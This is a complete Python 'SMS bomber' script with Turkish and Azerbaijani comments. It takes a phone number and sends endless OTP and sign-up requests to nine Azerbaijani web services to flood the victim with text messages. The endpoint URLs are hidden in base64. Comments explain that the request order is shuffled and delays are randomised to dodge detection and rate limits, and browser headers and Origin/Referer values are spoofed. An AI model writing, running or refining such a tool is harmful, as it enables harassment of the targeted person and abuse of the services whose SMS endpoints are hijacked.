import requests
import time
import random
import base64
from colorama import init, Fore, Style

init(autoreset=True)

OWNER = "@Card4r"
VERSION = "1.2 (Sonsuz Döngü)"

print(f"{Fore.MAGENTA}=== @BirkartX SMS BOMBER v{VERSION} ==={Style.RESET_ALL}")
print(f"{Fore.CYAN}Owner: {OWNER}{Style.RESET_ALL}\n")

def format_phone_variants(nomre):
    """Numarayı servislerin isteyebileceği farklı varyasyonlara ayırır"""
    clean = str(nomre).strip().replace(" ", "").replace("-", "").replace("+", "")
    if clean.startswith("0"):
        clean = "994" + clean[1:]
    elif not clean.startswith("994") and len(clean) == 9:
        clean = "994" + clean

    return {
        "with_plus": "+" + clean,           
        "no_plus": clean,                   
        "short_zero": "0" + clean[3:],      
        "pure_short": clean[3:]             
    }

# Base64 ile gizlenmiş API linkleri
_encoded_apis = [
    {"name": "Umico", "url": "aHR0cHM6Ly9jdXN0b21lci51bWljby5hei92My9jbGllbnRzL2FjY291bnQvc2lnbi1pbg=="},
    {"name": "Million", "url": "aHR0cHM6Ly9wZ2FwaS5taWxsaW9uLmF6L2FjY291bnQzL3JlZ2lzdHJhdGlvbi1yZXF1ZXN0"},
    {"name": "Masin", "url": "aHR0cHM6Ly93d3cubWFzaW4uYXovYXBpL2F1dGgvc2VuZC1waG9uZS1vdHA="},
    {"name": "Auto", "url": "aHR0cHM6Ly9hcGkuYXV0by5hei92Mi9hei9hdXRo"},
    {"name": "Tunel", "url": "aHR0cHM6Ly9hcGkudHVuZWwuYXovYXBpL2F1dGgvc2lnbnVw"},
    {"name": "Manato", "url": "aHR0cHM6Ly9hcGkubWFuYXRvLmF6L3dlYi9wdWJsaWMvY2xpZW50L3Bob25lL3Ntcy1jb2Rl"},
    {"name": "KFC", "url": "aHR0cHM6Ly9hcGkua2ZjLmF6L2FwaS92MS9jbGllbnQvdmFsaWRhdGUtZGF0YQ=="},
    {"name": "SMSRadar", "url": "aHR0cHM6Ly93ZWIuc21zcmFkYXIuYXovYXBpL2NvcmUvcmVnaXN0ZXIvc3RlcDE="},
    {"name": "Open.az", "url": "aHR0cHM6Ly9hcGkuYXV0by5hei92Mi9hei9hdXRo"} 
]

def decode_url(encoded):
    return base64.b64decode(encoded).decode('utf-8')

def send_infinite_loop(nomre):
    formats = format_phone_variants(nomre)
    
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Accept-Language": "az,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive"
    }

    apis = [
        {"name": "Umico", "url": decode_url(_encoded_apis[0]["url"]), "json": {"phone": formats["with_plus"]}, "headers": {**default_headers, "Origin": "https://umico.az", "Referer": "https://umico.az/"}},
        {"name": "Million", "url": decode_url(_encoded_apis[1]["url"]), "json": {"phoneNumber": formats["no_plus"]}, "headers": {**default_headers, "Origin": "https://www.million.az", "Referer": "https://www.million.az/"}},
        {"name": "Masin", "url": decode_url(_encoded_apis[2]["url"]), "json": {"phone": formats["no_plus"]}, "headers": {**default_headers, "Origin": "https://www.masin.az", "Referer": "https://www.masin.az/"}},
        {"name": "Auto", "url": decode_url(_encoded_apis[3]["url"]), "json": {"phone": formats["short_zero"]}, "headers": {**default_headers, "Origin": "https://auto.az", "Referer": "https://auto.az/"}},
        {"name": "Tunel", "url": decode_url(_encoded_apis[4]["url"]), "json": {"phone": formats["with_plus"]}, "headers": {**default_headers, "Origin": "https://tunel.az", "Referer": "https://tunel.az/"}},
        {"name": "Manato", "url": decode_url(_encoded_apis[5]["url"]), "json": {"mobilePhone": {"number": formats["pure_short"]}}, "headers": {**default_headers, "Origin": "https://manato.az", "Referer": "https://manato.az/"}},
        {"name": "KFC", "url": decode_url(_encoded_apis[6]["url"]), "json": {"firstname": "Ali", "lastname": "Aliyev", "phoneNumber": formats["with_plus"]}, "headers": {**default_headers, "Origin": "https://kfc.az", "Referer": "https://kfc.az/"}},
        {"name": "SMSRadar", "url": decode_url(_encoded_apis[7]["url"]), "json": {"source": "web", "app_id": 12, "operator": 3, "msisdn": formats["no_plus"]}, "headers": {**default_headers, "Origin": "https://smsradar.az", "Referer": "https://smsradar.az/"}},
        {"name": "Open.az", "url": decode_url(_encoded_apis[8]["url"]), "json": {"phone": formats["no_plus"]}, "headers": {**default_headers, "Origin": "https://open.az", "Referer": "https://open.az/"}}
    ]

    tur_sayaci = 1
    session = requests.Session()

    try:
        while True:
            print(f"{Fore.YELLOW}=== Tur {tur_sayaci} Başlatıldı ==={Style.RESET_ALL}")
            
            # Algoritmik tespitleri zorlaştırmak adına her turda istek sırasını karıştırıyoruz
            random.shuffle(apis)
            
            for api in apis:
                try:
                    # Detay logları kapatıldı, sadece işlem yapıldığı gösteriliyor
                    print(f"{Fore.CYAN}[>] İstekler gönderiliyor...{Style.RESET_ALL}", end="\r")
                    session.post(api["url"], json=api["json"], timeout=10, headers=api["headers"])
                except:
                    pass
                
                # Ağ geçitlerinde kısıtlamaya yakalanmamak için kısa aralıklar
                time.sleep(random.uniform(1.5, 3.0))
            
            print(f"{Fore.GREEN}✅ Tur {tur_sayaci} tamamlandı. Devam ediliyor...{Style.RESET_ALL}\n")
            tur_sayaci += 1
            time.sleep(5) # Turlar arası kısa nefes alma süresi

    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 İşlem kullanıcı tarafından durduruldu.{Style.RESET_ALL}")

# ================== ANA MENÜ ==================
if __name__ == "__main__":
    while True:
        print(f"{Fore.CYAN}Nömrə daxil et (070... və ya 994...): {Style.RESET_ALL}", end="")
        nomre = input()
        if nomre.lower() in ['exit', 'q', 'çıx']:
            print(f"{Fore.MAGENTA}Bot bağlandı. Owner: {OWNER}{Style.RESET_ALL}")
            break

        if not nomre.isdigit() or len(nomre) < 9:
            print(f"{Fore.RED}⚠️ Xətalı nömrə formatı! Yenidən yoxlayın.{Style.RESET_ALL}\n")
            continue

        print(f"\n{Fore.MAGENTA}🚀 {nomre} nömrəsinə sonsuz döngü başlatıldı... (Durdurmak için CTRL+C yapın){Style.RESET_ALL}\n")
        send_infinite_loop(nomre)
        print(f"{Fore.GREEN}📊 Döngüden çıkıldı.{Style.RESET_ALL}\n")
